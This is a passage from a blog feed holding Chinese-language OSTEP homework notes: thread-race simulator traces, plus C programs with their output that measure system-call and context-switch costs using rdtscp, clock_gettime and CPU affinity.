class="string"><span class="meta">    2   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 1 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 1</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    0                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 2 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1006 halt</span></span></span><br></pre></td></tr></table></figure><p>不在临界区之间发生中断就可以的到正确结果</p><ol start="7"><li></li></ol><p>可想而知，只有-i 3及更大可以避开竞态区</p><ol start="8"><li></li></ol><p>围绕着不在临界区发生中断来</p><p>-i 大于597(执行100次共600条指令，后面三条和竞态没关系)或者是3的倍数就可以</p><ol start="9"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; cat wait-<span class="keyword">for</span>-me.s</span><br><span class="line">.main</span><br><span class="line">test $<span class="number">1</span>, %ax     <span class="meta"># ax should be 1 (signaller) or 0 (waiter)</span></span><br><span class="line">je .signaller</span><br><span class="line"></span><br><span class="line">.waiter</span><br><span class="line">mov  <span class="number">2000</span>, %cx</span><br><span class="line">test $<span class="number">1</span>, %cx</span><br><span class="line">jne .waiter</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line">.signaller</span><br><span class="line">mov  $<span class="number">1</span>, <span class="number">2000</span></span><br><span class="line">halt</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p wait-<span class="keyword">for</span>-me.s -a ax=<span class="number">1</span>,ax=<span class="number">0</span> -R ax,cx -M <span class="number">2000</span> -c</span><br><span class="line">ARG seed <span class="number">0</span></span><br><span class="line">ARG numthreads <span class="number">2</span></span><br><span class="line">ARG program wait-<span class="keyword">for</span>-me.s</span><br><span class="line">ARG interrupt frequency <span class="number">50</span></span><br><span class="line">ARG interrupt randomness False</span><br><span class="line">ARG argv ax=<span class="number">1</span>,ax=<span class="number">0</span></span><br><span class="line">ARG load address <span class="number">1000</span></span><br><span class="line">ARG memsize <span class="number">128</span></span><br><span class="line">ARG memtrace <span class="number">2000</span></span><br><span class="line">ARG regtrace ax,cx</span><br><span class="line">ARG cctrace False</span><br><span class="line">ARG printstats False</span><br><span class="line">ARG verbose False</span><br><span class="line"></span><br><span class="line"> <span class="number">2000</span>      ax    cx          Thread <span class="number">0</span>                Thread <span class="number">1</span></span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span></span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1001</span> je .signaller</span><br><span class="line">    <span class="number">1</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1006</span> mov  $<span class="number">1</span>, <span class="number">2000</span></span><br><span class="line">    <span class="number">1</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1007</span> halt</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>   ----- Halt;Switch -----  ----- Halt;Switch -----</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>                            <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>                            <span class="number">1001</span> je .signaller</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1002</span> mov  <span class="number">2000</span>, %cx</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1003</span> test $<span class="number">1</span>, %cx</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1004</span> jne .waiter</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1005</span> halt</span><br></pre></td></tr></table></figure><ol start="10"><li></li></ol><p>相当于交换线程，在线程0等待到中断后线程1把eax设为1，之前都在做无用循环</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>       <span class="number">0</span>     <span class="number">0</span>   <span class="number">1002</span> mov  <span class="number">2000</span>, %cx</span><br><span class="line"> <span class="number">0</span>       <span class="number">0</span>     <span class="number">0</span>   <span class="number">1003</span> test $<span class="number">1</span>, %cx</span><br><span class="line"> <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   ------ Interrupt ------  ------ Interrupt ------</span><br><span class="line"> <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>                            <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:6 Mechanism:Limited Direct Execution Homework</title>
      <link href="/2023/04/15/OSTEP-homework-6-Mechanism-Limited-Direct-Execution/"/>
      <url>/2023/04/15/OSTEP-homework-6-Mechanism-Limited-Direct-Execution/</url>
      
        <content type="html"><![CDATA[<ol><li></li></ol><p>书里说的rdtsc(TSC是一个64位的寄存器记录处理器从启动到现在的时钟周期数)把高32位放入edx，低32位放入rax，在多核处理器好像已经不太准确，</p><ul><li>CPU乱序执行之后，无法保证 rdtsc 指令的执行一定是在业务代码执行的之前和之后</li><li>处理器的变频</li><li>无法保证每个CPU核心的 TSC 寄存器是同步的</li></ul><p>引入了常量速率TSC的特性解决了变频问题<code> cat /proc/cpuinfo | grep constant_tsc</code>查看处理器是否支持，但是不能估计时间</p><p>对于乱序问题我们可以加cpu级的memory barrier<code>mfence</code></p><p>或者用rdtscp,他具有序列化特性，即它会在指令执行前等待之前的所有指令都执行完毕，并且在指令执行后保证没有后续指令会在它之前执行<code>cat /proc/cpuinfo | grep rdtscp</code>查看是否支持</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> period = <span class="number">0</span>, period2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> low = <span class="number">0</span>, hight = <span class="number">0</span>,low2 = <span class="number">0</span>, hight2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./test.c&quot;</span>, O_RDWR);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtscp&quot;</span>:<span class="string">&quot;=a&quot;</span>(low), <span class="string">&quot;=d&quot;</span>(hight))</span>;</span><br><span class="line">    period = hight &lt;&lt; <span class="number">32</span> | low;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (&quot;mfence&quot; : : : &quot;memory&quot;);//如果要使用rdtsc需要加barrier来防止乱序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(fd, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (&quot;mfence&quot; : : : &quot;memory&quot;);</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtscp&quot;</span>:<span class="string">&quot;=a&quot;</span>(low), <span class="string">&quot;=d&quot;</span>(hight))</span>;</span><br><span class="line">    period2 = hight &lt;&lt; <span class="number">32</span> | low;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, period/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, period2/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, (period2 - period)/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span>&gt; <span class="keyword">while</span> <span class="literal">true</span> ;taskset -c <span class="number">1</span> sudo ./test;end</span><br><span class="line"><span class="number">35475179</span></span><br><span class="line"><span class="number">35475567</span></span><br><span class="line"><span class="number">387</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35475595</span></span><br><span class="line"><span class="number">35475995</span></span><br><span class="line"><span class="number">399</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476026</span></span><br><span class="line"><span class="number">35476421</span></span><br><span class="line"><span class="number">395</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476449</span></span><br><span class="line"><span class="number">35476848</span></span><br><span class="line"><span class="number">399</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476881</span></span><br><span class="line"><span class="number">35477275</span></span><br><span class="line"><span class="number">393</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35477304</span></span><br><span class="line"><span class="number">35477695</span></span><br><span class="line"><span class="number">390</span></span><br><span class="line">-----------</span><br><span class="line">^C⏎ </span><br></pre></td></tr></table></figure><p>如果想要一个准确时间可以用clock_gettime，会比gettimeofday准一点,gettimeofday和clock_gettime函数返回的是当前系统时钟的时间值，而不是指令的执行时间，所以没用barrier来防止乱序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./test.c&quot;</span>, O_RDWR);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start_time</span>, <span class="title">end_time</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    struct timespec &#123;</span></span><br><span class="line"><span class="comment">    time_t tv_sec;  // 秒</span></span><br><span class="line"><span class="comment">    long tv_nsec;   // 纳秒</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    clock_gettime(CLOCK_MONOTONIC, &amp;start_time);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(fd, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    clock_gettime(CLOCK_MONOTONIC, &amp;end_time);</span><br><span class="line">    <span class="type">double</span> elapsed_time = (end_time.tv_sec * <span class="number">1e9</span> + end_time.tv_nsec - start_time.tv_sec * <span class="number">1e9</span> - start_time.tv_nsec)/<span class="number">1000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ns:%f\n&quot;</span>, elapsed_time);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;us:%f\n&quot;</span>, elapsed_time / <span class="number">1000.0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ms:%f\n&quot;</span>, elapsed_time / <span class="number">1e6</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/6 [SIGINT]&gt; gcc -g -o  test test.c</span><br><span class="line">grxer@grxer ~/D/s/O/o/6&gt; while true ;taskset -c 1 sudo ./test;end</span><br><span class="line">ns:127.141074</span><br><span class="line">us:0.127141</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:127.567767</span><br><span class="line">us:0.127568</span><br><span class="line">ms:0.000128</span><br><span class="line">ns:126.079839</span><br><span class="line">us:0.126080</span><br><span class="line">ms:0.000126</span><br><span class="line">ns:127.143936</span><br><span class="line">us:0.127144</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:126.850415</span><br><span class="line">us:0.126850</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:121.985531</span><br><span class="line">us:0.121986</span><br><span class="line">ms:0.000122</span><br><span class="line">ns:119.445469</span><br><span class="line">us:0.119445</span><br><span class="line">ms:0.000119</span><br><span class="line">ns:119.942527</span><br><span class="line">us:0.119943</span><br><span class="line">ms:0.000120</span><br><span class="line">^C⏎   </span><br></pre></td></tr></table></figure><p>两种方式比较一下，看了下cpu主频<code>cpu MHz         : 3193.924</code> 那么一条指令周期1 &#x2F; 3193.924MHz &#x3D; 0.312975 ns，0.312975*395&#x3D;123.625125ns</p><p>两种方式相差无几</p><ol start="2"><li></li></ol><p>需要测量上下文切换成本，</p><p>需要把程序限制到一个cpu上做切换，这次我们用<code>sched_setaffinity</code>来实现绑定指定处理器而不是用taskset(PS:简单测试了一下fork子进程是会跑在父进程的cpu亲合力掩码)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE             <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sched_setaffinity</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">size_t</span> cpusetsize,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">cpu_set_t</span> *mask)</span>;</span><br><span class="line">pid为<span class="number">0</span>设置当前进程否则pid进程</span><br><span class="line">cpusetsize一般给<span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>)</span><br><span class="line">mask CPU位掩码 的操作</span><br><span class="line">CPU_ZERO()：清除集合的内容，让其不包含任何CPU。</span><br><span class="line"></span><br><span class="line">CPU_SET()：添加cpu到集合中。</span><br><span class="line"></span><br><span class="line">CPU_CLR()：从集合中移除cpu</span><br><span class="line"></span><br><span class="line"><span class="title function_">CPU_ISSET</span><span class="params">()</span> ：测试cpu是否在集合中。</span><br><span class="line"></span><br><span class="line"><span class="title function_">CPU_COUNT</span><span class="params">()</span>：返回集合中包含的CPU数量。</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   <span class="comment">// exit</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span> <span class="comment">// waitpid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>   <span class="comment">// fork, pipe, close, write, dup2</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> mask;</span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(<span class="number">3</span>, &amp;mask);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>];</span><br><span class="line">    <span class="type">pid_t</span> rc;</span><br><span class="line">    <span class="type">int</span> re = sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(mask), &amp;mask);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == re) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setscheduler&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> pipefd1[<span class="number">2</span>], pipefd2[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd1) &lt; <span class="number">0</span> || pipe(pipefd2) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;;</span><br><span class="line">    rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;----------------------%d\n&quot;, i);</span></span><br><span class="line">            read(pipefd1[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">            write(pipefd2[<span class="number">1</span>], <span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> timespec start_time, end_time;</span><br><span class="line">        clock_gettime(CLOCK_MONOTONIC, &amp;start_time);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;+++++%d\n&quot;, i);</span></span><br><span class="line">            write(pipefd1[<span class="number">1</span>], <span class="string">&quot;0&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            read(pipefd2[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clock_gettime(CLOCK_MONOTONIC, &amp;end_time);</span><br><span class="line">        <span class="type">double</span> elapsed_time = (end_time.tv_sec * <span class="number">1e9</span> + end_time.tv_nsec - start_time.tv_sec * <span class="number">1e9</span> - start_time.tv_nsec) / <span class="number">1000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ns:%f\n&quot;</span>, elapsed_time);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;us:%f\n&quot;</span>, elapsed_time / <span class="number">1000.0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ms:%f\n&quot;</span>, elapsed_time / <span class="number">1e6</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看你一些cpu affinity父子都绑定到了8(100)就是我们的设置的第三个cpu<code>    CPU_SET(3, &amp;mask);</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~&gt; ps -a</span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">   2677 pts/12   00:00:04 fish</span><br><span class="line">   8612 tty2     00:00:00 gnome-session-b</span><br><span class="line">   9251 pts/13   00:00:00 tmux: client</span><br><span class="line">   9276 pts/14   00:00:00 fish</span><br><span class="line">   9316 pts/15   00:00:00 fish</span><br><span class="line">  36681 pts/14   00:00:01 gdb</span><br><span class="line">  36697 pts/14   00:00:00 test &lt;defunct&gt;</span><br><span class="line">  48284 pts/23   00:00:00 fish</span><br><span class="line">  50253 pts/24   00:00:00 fish</span><br><span class="line">  54215 pts/38   00:00:02 2</span><br><span class="line">  54216 pts/38   00:00:02 2</span><br><span class="line">  54309 pts/24   00:00:00 ps</span><br><span class="line">grxer@grxer ~&gt; taskset -p 54216</span><br><span class="line">pid 54216&#x27;s current affinity mask: 8</span><br><span class="line">grxer@grxer ~&gt; taskset -p 54215</span><br><span class="line">pid 54215&#x27;s current affinity mask: 8</span><br></pre></td></tr></table></figure><p>交替阻塞，交替上下文切换</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span> [SIGINT]&gt; gcc -g -o <span class="number">2</span> <span class="number">2.</span>c</span><br><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span>&gt; ./<span class="number">2</span></span><br><span class="line">ns:<span class="number">4238.650005</span></span><br><span class="line">us:<span class="number">4.238650</span></span><br><span class="line">ms:<span class="number">0.004239</span></span><br></pre></td></tr></table></figure><p>这个时间应该再需要减去两次写入，两次读取时间，懒得搞了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:6 Mechanism:Limited Direct Execution</title>
      <link href="/2023/04/13/OSTEP-6-Mechanism-Limited-Direct-Execution/"/>
      <url>/2023/04/13/OSTEP-6-Mechanism-Limited-Direct-Execution/</url>
      
